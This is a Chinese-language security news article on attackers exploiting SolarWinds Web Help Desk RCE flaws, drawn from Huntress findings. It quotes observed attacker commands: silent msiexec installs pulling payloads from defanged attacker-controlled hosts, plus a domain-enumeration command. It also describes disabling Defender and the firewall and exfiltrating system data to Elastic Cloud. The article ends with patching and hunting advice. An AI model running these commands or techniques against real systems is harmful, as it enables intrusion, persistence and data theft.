#  黑客正积极利用 SolarWinds Web Help Desk 的远程代码执行漏洞部署自定义工具  
原创 网络安全9527
                    网络安全9527  安全圈的那点事儿   2026-02-09 05:48  
  
SolarWinds Web Help Desk (WHD) 中的远程代码执行 (RCE) 漏洞正被积极利用，攻击者迅速将受感染的实例武器化，以部署合法但被严重滥用的管理工具。  
  
根据 Huntress 的观察，其合作伙伴基础中的 78 个组织中的 84 个终端目前正在运行 SolarWinds Web Help Desk，这凸显了其广泛的风险敞口。  
  
Huntress 观察到源自被入侵的 WHD 服务的后渗透活动。攻击链始于wrapper.exeWHD 服务包装器，它启动了java.exe底层基于 Tomcat 的应用程序。随后，Java 进程执行cmd.exe以静默方式安装远程 MSI 有效载荷：  
```
msiexec /q /i hxxps://files.catbox[.]moe/tmp9fc.msi
```  
  
该有效载荷通过 Catbox 文件托管服务部署了 Zoho ManageEngine RMM（Zoho Assist）代理。虽然 Zoho Assist 本身是一款合法的远程管理工具，但由于其能够提供持续的无人值守访问权限，因此已成为常见的后渗透攻击目标。在本例中，该代理注册到攻击者控制的 Zoho 帐户，该帐户与 Proton Mail 地址关联，从而实现了即时交互式控制。  
  
这一活动与微软 2 月 6 日发布的公告密切相关，该公告确认了 SolarWinds WHD 漏洞已被实际利用，用于远程代码执行和后续工具部署。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BicXBAdicJy7NkhXcp0kffcdrbB2ibye7BMGd1N6cjRxKm24FoXGoWib9LibavClUXVg3IhJP98ByYyC76zq1cibic2AzvcgkcEhMJE7zYj7rbvJ3Y/640?wx_fmt=jpeg "")  
### 侦察和横向移动  
  
RMM代理激活后，攻击者转而进行实际的键盘操作。TOOLSIQ.EXE他们以Zoho RMM进程（）作为执行上下文，启动了Active Directory侦察：  
```
net group "domain computers" /do
```  
  
枚举步骤是横向移动的经典先决条件，它允许攻击者映射加入域的系统并确定目标优先级。  
  
侦察结束后不久，攻击者通过另一个托管在攻击者控制的 Supabase 存储桶上的静默 MSI 安装程序部署了开源 DFIR 平台 Velociraptor ：  
```
msiexec /q /i hxxps://vdfccjpnedujhrzscjtq.supabase[.]co/.../v4.msi
```  
  
虽然 Velociraptor 是为防御者设计的，但它执行命令、收集工件和远程控制端点的能力，使其在被滥用时成为一个有效的命令与控制 (C2) 框架。  
  
观察到的部署使用了 Velociraptor 版本 0.73.4——这是一个过时的版本，存在已知的权限提升漏洞，该漏洞曾在之前的攻击活动中出现过。  
  
Velociraptor 客户端与托管在 Cloudflare Worker 后面的攻击者基础设施进行通信auth.qgtxtebl.workers[.]dev，这种模式以前与 ToolShell 漏洞利用和 Warlock 勒索软件活动有关。  
  
攻击者利用 Velociraptor 作为 Windows 服务运行，并快速执行了一系列经过 base64 编码的 PowerShell 命令。这些命令包括通过修改注册表禁用 Windows Defender 和 Windows 防火墙，随后立即从 GitHub 官方发布渠道安装了 Cloudflared。这创建了一条基于隧道的备用访问路径，从而在一条 C2 通道中断时提供冗余。  
  
其中一项较为引人注目的攻击手法是利用某种工具窃取详细的系统信息Get-ComputerInfo，然后通过批量 API 将这些信息直接推送到攻击者控制的 Elastic Cloud 部署环境中。实际上，攻击者利用 Elastic 自身的 SIEM 工具构建了一个集中式的受害者管理和分类平台——这与防御者的工具功能形成了鲜明的对比，颇具讽刺意味。  
  
此次攻击活动凸显了攻击者如何能够迅速从单一的互联网管理界面过渡到完全交互式控制、持久化和企业级可见性，他们通常使用与正常管理噪音混为一谈的可信工具。  
  
使用 SolarWinds Web Help Desk 的组织应立即更新至 2026.1 或更高版本，该版本修复了CVE-2025-26399、CVE-2025-40536 和CVE-2025-40551漏洞。应将管理接口从直接暴露于互联网的环境中移除，轮换凭据，并检查主机是否存在未经授权的远程访问工具、静默 MSI 安装以及与 WHD 进程关联的加密 PowerShell 执行。  
  
随着攻击手段的不断扩散，防御者应假设攻击者会主动扫描并迅速利用这些手段，并做出相应的应对。  
  
